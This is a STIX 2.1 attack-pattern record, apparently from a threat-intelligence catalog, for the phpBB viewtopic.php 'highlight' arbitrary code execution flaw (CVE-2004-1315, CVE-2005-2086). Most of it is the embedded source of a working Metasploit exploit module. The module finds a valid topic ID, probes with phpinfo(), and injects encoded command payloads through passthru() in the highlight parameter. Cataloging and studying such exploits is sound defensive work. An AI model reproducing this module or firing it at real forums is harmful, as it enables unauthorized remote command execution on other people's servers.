{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4494363c-8e2d-4145-9964-0a674d7ef9b6",
    "created": "2024-08-14T17:12:35.904123Z",
    "modified": "2024-08-14T17:12:35.904127Z",
    "name": "phpBB viewtopic.php Arbitrary Code Execution",
    "description": " This module exploits two arbitrary PHP code execution flaws in the phpBB forum system. The problem is that the 'highlight' parameter in the 'viewtopic.php' script is not verified properly and will allow an attacker to inject arbitrary code via preg_replace().  This vulnerability was introduced in revision 3076, and finally fixed in revision 5166. According to the \"tags\" within their tree this corresponds to versions 2.0.4 through 2.0.15 (inclusive). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/phpbb_highlight.rb",
            "external_id": "phpbb_highlight.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2005-2086"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-1315"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'phpBB viewtopic.php Arbitrary Code Execution',\n      'Description'    => %q{\n          This module exploits two arbitrary PHP code execution flaws in the\n        phpBB forum system. The problem is that the 'highlight' parameter\n        in the 'viewtopic.php' script is not verified properly and will\n        allow an attacker to inject arbitrary code via preg_replace().\n\n        This vulnerability was introduced in revision 3076, and finally\n        fixed in revision 5166. According to the \"tags\" within their tree,\n        this corresponds to versions 2.0.4 through 2.0.15 (inclusive).\n      },\n      'Author'         => [ 'valsmith[at]metasploit.com', 'hdm', 'aushack' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2005-2086'],\n          [ 'CVE', '2004-1315'],\n          [ 'OSVDB', '11719'],\n          [ 'OSVDB', '17613'],\n          [ 'BID', '14086'],\n          [ 'BID', '10701'],\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 1024,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd cmd_bash',\n              'RequiredCmd' => 'generic perl ruby python bash-tcp telnet',\n            }\n        },\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Targets'        =>\n        [\n          [ 'Automatic', \t\t{ }],\n          [ 'phpbb <=2.0.10', \t{ }],\n          [ 'phpbb <=2.0.15', \t{ }],\n        ],\n      'DisclosureDate' => '2004-11-12',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('URI', [true, \"The phpBB root Directory\", \"/phpBB2\"]),\n        OptString.new('TOPIC', [false, \"The ID of a valid topic\"]),\n      ])\n  end\n\n  def find_topic\n\n    1.upto(32) do |x|\n\n    res = send_request_raw({\n        'uri'\t=> normalize_uri(datastore['URI'], '/viewtopic.php') + '?topic=' + x.to_s,\n      }, 25)\n\n    if (res and res.body.match(/class=\"postdetails\"/))\n      print_status(\"Discovered valid topic ID: #{x}\")\n      return x\n    end\n\n    end\n    return false\n\n  end\n\n  def exploit\n\n    topic = datastore['TOPIC'] || find_topic\n\n    if !(topic)\n      print_status(\"No valid topic ID found, please specify the TOPIC option.\")\n      return\n    else\n\n      sploit = normalize_uri(datastore['URI'], \"/viewtopic.php\") + \"?t=#{topic}&highlight=\"\n\n      case target.name\n      when /Automatic/\n        req = \"/viewtopic.php?t=#{topic}&highlight=%2527%252ephpinfo()%252e%2527\"\n\n        res = send_request_raw({\n        'uri'\t=> normalize_uri(datastore['URI'], req)\n        }, 25)\n\n        print_status(\"Trying to determine which attack method to use...\")\n\n        if (res and res.body =~ /\\<title>phpinfo/)\n          byte = payload.encoded.unpack('C*').map! { |ch| ch = \"chr(#{ch})\" }.join('%252e')\n          sploit << \"%2527%252epassthru(#{byte})%252e%2527\"\n        else\n          byte = payload.encoded.unpack('C*').map! { |ch| ch = \"chr(#{ch})\" }.join('.')\n          sploit << \"%27.passthru(#{byte}).%27\"\n        end\n\n      when /2\\.0\\.10/\n        byte = payload.encoded.unpack('C*').map! { |ch| ch = \"chr(#{ch})\" }.join('%252e')\n        sploit << \"%2527%252epassthru(#{byte})%252e%2527\"\n      when /2\\.0\\.15/\n        byte = payload.encoded.unpack('C*').map! { |ch| ch = \"chr(#{ch})\" }.join('.')\n        sploit << \"%27.passthru(#{byte}).%27\"\n      end\n\n      res = send_request_raw({\n      'uri'\t=> sploit\n      }, 25)\n\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-11-12",
    "x_mitre_platforms": [
        "unix'"
    ]
}